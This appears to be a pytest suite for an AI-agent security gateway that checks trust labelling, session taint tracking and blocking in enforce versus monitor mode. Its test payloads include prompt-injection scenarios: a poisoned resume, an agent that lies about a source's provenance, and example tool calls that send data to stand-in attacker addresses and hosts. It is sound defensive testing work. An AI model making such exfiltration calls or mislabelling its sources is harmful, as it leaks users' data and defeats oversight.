import pytest
from backend.app.schemas.gateway import ContextSource, ToolCallRequest
from backend.app.core.trust_labeler import label_trust
from backend.app.core.taint_tracker import track_session_taint
from backend.app.core.policy_engine import PolicyEngine
from backend.app.core.gateway import GatewayCore
from backend.app.db.database import get_session, list_audit_events

def test_authoritative_server_side_trust_labeling():
    # 1. Untrusted source types (document, email, web, api) must be labeled UNTRUSTED
    # even when an adversary or agent attempts to supply is_untrusted=False
    adversarial_doc = ContextSource(
        source_id="poisoned_resume.pdf",
        source_type="document",
        is_untrusted=False,
        snippet="Candidate with hidden injection"
    )
    normalized, disagreements = label_trust([adversarial_doc])
    assert len(normalized) == 1
    assert normalized[0].is_untrusted is True
    assert len(disagreements) == 1
    assert "disagreement on source 'poisoned_resume.pdf'" in disagreements[0]

    adversarial_web = ContextSource(
        source_id="https://attacker.com/payload",
        source_type="web",
        is_untrusted=False
    )
    normalized_web, _ = label_trust([adversarial_web])
    assert normalized_web[0].is_untrusted is True

    # 2. Authenticated user prompt is TRUSTED even if flagged is_untrusted=True
    user_prompt = ContextSource(
        source_id="user_console",
        source_type="direct_user_prompt",
        is_untrusted=True
    )
    normalized_user, disagreements_user = label_trust([user_prompt])
    assert normalized_user[0].is_untrusted is False
    assert len(disagreements_user) == 1

def test_session_taint_propagation_across_sequential_calls(test_db):
    session_id = "sess-taint-lifecycle-001"
    agent_id = "hr-agent"

    # Call 1: Reading untrusted document taints the session
    req1 = ToolCallRequest(
        trace_id="trc-001",
        agent_id=agent_id,
        session_id=session_id,
        tool_name="read_doc",
        arguments={"file_path": "uploaded_cv.pdf"},
        context_sources=[
            {"source_id": "uploaded_cv.pdf", "source_type": "document", "is_untrusted": False}
        ]
    )
    dec1, _, _, risk1, _, _ = GatewayCore.evaluate(req1)
    assert dec1 == "allow"
    assert risk1["untrusted_taint"] == 38

    # Verify session is marked tainted in database
    sess1 = get_session(session_id)
    assert sess1 is not None
    assert bool(sess1["is_tainted"]) is True
    assert "uploaded_cv.pdf" in sess1["tainted_by"]

    # Call 2: Subsequent tool call with NO context sources inherits taint from session
    req2 = ToolCallRequest(
        trace_id="trc-002",
        agent_id=agent_id,
        session_id=session_id,
        tool_name="db_query",
        arguments={"query": "SELECT candidate_id FROM candidates WHERE role = 'engineer'"},
        context_sources=[]
    )
    dec2, _, _, risk2, _, _ = GatewayCore.evaluate(req2)
    assert dec2 == "allow"
    # Still tainted from step 1
    assert risk2["untrusted_taint"] == 38

    # Independent clean session remains clean
    clean_session_id = "sess-clean-002"
    req_clean = ToolCallRequest(
        trace_id="trc-003",
        agent_id=agent_id,
        session_id=clean_session_id,
        tool_name="db_query",
        arguments={"query": "SELECT id FROM departments"},
        context_sources=[
            {"source_id": "admin_cli", "source_type": "direct_user_prompt", "is_untrusted": False}
        ]
    )
    dec_c, _, _, risk_c, _, _ = GatewayCore.evaluate(req_clean)
    assert dec_c == "allow"
    assert risk_c["untrusted_taint"] == 0
    sess_c = get_session(clean_session_id)
    assert sess_c is None or not bool(sess_c["is_tainted"])

def test_policy_engine_enforce_vs_monitor_mode(client, test_db):
    session_id = "sess-policy-mode-001"
    agent_id = "finance-agent"

    # Step 1: Taint session with untrusted document
    client.post("/api/v1/gateway/execute", json={
        "trace_id": "trc-pm-001",
        "agent_id": agent_id,
        "session_id": session_id,
        "tool_name": "read_doc",
        "arguments": {"file_path": "incoming_vendor_invoice.pdf"},
        "context_sources": [
            {"source_id": "incoming_vendor_invoice.pdf", "source_type": "document"}
        ]
    })

    # Tool call attempting external exfiltration to unapproved recipient
    exfil_payload = {
        "trace_id": "trc-pm-002",
        "agent_id": agent_id,
        "session_id": session_id,
        "tool_name": "send_email",
        "arguments": {"to": "exfil@untrusted-domain.xyz", "body": "Leaked invoice data"},
        "context_sources": []
    }

    # 1. ENFORCE MODE (default) -> BLOCK
    PolicyEngine.set_mode("enforce")
    res_enf = client.post("/api/v1/gateway/execute", json=exfil_payload)
    assert res_enf.status_code == 200
    data_enf = res_enf.json()
    assert data_enf["decision"] == "block"
    assert "blocked" in data_enf["reason"].lower()
    assert data_enf["risk_score"] >= 70

    # 2. MONITOR MODE -> Gateway returns allow to agent, but logs would_block in audit event store
    PolicyEngine.set_mode("monitor")
    exfil_payload["trace_id"] = "trc-pm-003"
    res_mon = client.post("/api/v1/gateway/execute", json=exfil_payload)
    assert res_mon.status_code == 200
    data_mon = res_mon.json()
    # Agent receives allow so it can continue
    assert data_mon["decision"] == "allow"
    assert "[MONITOR MODE]" in data_mon["reason"]

    # Verify event store records 'would_block'
    events = list_audit_events(limit=5, order="desc")
    latest_event = events[0]
    assert latest_event["trace_id"] == "trc-pm-003"
    assert latest_event["decision"] == "would_block"

def test_lying_agent_provenance_taint_and_block(client, test_db):
    """
    Test where a compromised or lying agent invokes read_doc on a poisoned file
    and falsely labels the source 'authenticated_user_prompt' with is_untrusted=False.
    The gateway's tool-provenance engine must override the lie, taint the session,
    and block subsequent exfiltration inline.
    """
    session_id = "sess-lying-agent-001"
    agent_id = "hr-agent"
    PolicyEngine.set_mode("enforce")

    # Step 1: Lying agent invokes read_doc claiming trusted user input
    res1 = client.post("/api/v1/gateway/execute", json={
        "trace_id": "trc-lie-001",
        "agent_id": agent_id,
        "session_id": session_id,
        "tool_name": "read_doc",
        "arguments": {"file_path": "poisoned_resume.pdf.txt"},
        "context_sources": [{
            "source_id": "poisoned_resume.pdf.txt",
            "source_type": "authenticated_user_prompt",
            "is_untrusted": False, # LIE: claims trusted
            "snippet": "Hidden payload"
        }]
    })
    assert res1.status_code == 200
    data1 = res1.json()
    assert data1["decision"] == "allow"
    # Provenance override warning must be reported in reason
    assert "provenance override" in data1["reason"].lower()

    # Verify session is tainted despite the agent's false claim
    sess = get_session(session_id)
    assert sess is not None
    assert bool(sess["is_tainted"]) is True

    # Step 2: Agent attempts to exfiltrate to external recipient
    res2 = client.post("/api/v1/gateway/execute", json={
        "trace_id": "trc-lie-002",
        "agent_id": agent_id,
        "session_id": session_id,
        "tool_name": "send_email",
        "arguments": {"to": "attacker@darkweb.org", "body": "Exfiltrated data"},
        "context_sources": []
    })
    assert res2.status_code == 200
    data2 = res2.json()
    assert data2["decision"] == "block"
    assert "tainted" in data2["reason"].lower()

def test_external_api_approved_destinations(client, test_db):
    """
    Verifies approved-destination handling for external_api:
    - Approved partners (api.github.com, partner.org) and internal hosts/localhost are ALLOWED.
    - Unapproved endpoints from a tainted session are BLOCKED.
    """
    PolicyEngine.set_mode("enforce")
    session_id = "sess-api-dest-001"

    # Taint session with incoming email
    client.post("/api/v1/gateway/execute", json={
        "trace_id": "trc-api-001",
        "agent_id": "code-agent",
        "session_id": session_id,
        "tool_name": "read_email",
        "arguments": {"id": "msg-123"},
        "context_sources": []
    })

    # Call 1: Approved partner GitHub API -> ALLOWED
    res_github = client.post("/api/v1/gateway/execute", json={
        "trace_id": "trc-api-002",
        "agent_id": "code-agent",
        "session_id": session_id,
        "tool_name": "external_api",
        "arguments": {"url": "https://api.github.com/repos/sentinel/mesh/pulls"}
    })
    assert res_github.status_code == 200
    assert res_github.json()["decision"] == "allow"

    # Call 2: Approved internal host -> ALLOWED
    res_internal = client.post("/api/v1/gateway/execute", json={
        "trace_id": "trc-api-003",
        "agent_id": "code-agent",
        "session_id": session_id,
        "tool_name": "external_api",
        "arguments": {"url": "http://service.sentinelmesh.internal/api/v1/health"}
    })
    assert res_internal.status_code == 200
    assert res_internal.json()["decision"] == "allow"

    # Call 3: Unapproved external exfiltration endpoint -> BLOCKED
    res_unapproved = client.post("/api/v1/gateway/execute", json={
        "trace_id": "trc-api-004",
        "agent_id": "code-agent",
        "session_id": session_id,
        "tool_name": "external_api",
        "arguments": {"url": "https://data-exfil-sink.ru/upload"}
    })
    assert res_unapproved.status_code == 200
    data_unapp = res_unapproved.json()
    assert data_unapp["decision"] == "block"
    assert "tainted" in data_unapp["reason"].lower()
